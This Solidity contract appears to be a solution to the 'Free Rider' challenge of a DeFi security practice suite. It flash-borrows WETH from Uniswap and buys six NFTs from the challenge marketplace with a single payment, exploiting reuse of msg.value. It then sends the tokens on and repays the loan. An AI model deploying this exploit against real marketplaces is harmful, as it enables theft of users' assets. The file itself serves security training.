pragma solidity ^0.8.0;

import './IUniswapV2Callee.sol';
import '../free-rider/FreeRiderNFTMarketplace.sol';
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

interface IUniswap{
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}
interface IWETH9 {
    function transfer(address to, uint256 amount) external returns (bool);
    function deposit() external payable;
    function withdraw(uint256) external; 
    function balanceOf(address account) external returns (uint256);
}
interface ImarketPlace {
    function buyMany(uint256[] calldata _tokens) external payable;
}

contract hackFreeRiderPool is IUniswapV2Callee, IERC721Receiver{
    address payable public weth;
    address payable public marketPlace;
    address public nft;
    address public buyer;
    constructor(address payable _weth, address payable _marketPlace, address _nft, address _buyer) {
        weth = _weth;
        marketPlace = _marketPlace;
        nft = _nft;
        buyer = _buyer;
    }
    function hackIt(address uniswapAddress) external payable {    
        IUniswap(uniswapAddress).swap(16 ether, 0 , address(this) , new bytes(0x23423));
    }   

    function uniswapV2Call(address _sender , uint amount0, uint amount1, bytes calldata data) external override {
        // Step-1 : Convert WETH to ETH 
            IWETH9(weth).withdraw(amount0);

        // Step-2 : Buy from the NFT MarketPlace
            uint[] memory tokens = new uint[](6);
            for(uint i=0; i<6; i++){
                tokens[i]=i;
            }
            ImarketPlace(marketPlace).buyMany{value : 16 ether}(tokens);

            // Step-3 : Send the NFTs to the buyer
            for(uint i=0;i<=5;i++){
                IERC721(nft).safeTransferFrom(address(this), buyer, tokens[i]);
            }
            // Step-4 : Return the WETH to the swap 
            IWETH9(weth).deposit{value : address(this).balance}();
            IWETH9(weth).transfer(msg.sender, (amount0*uint(1000))/uint(996));

    }

      function onERC721Received(
        address,
        address,
        uint256 _tokenId,
        bytes memory
    )
    external 
    override 
    returns (bytes4){
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {

    }

    fallback() external payable {

    }
}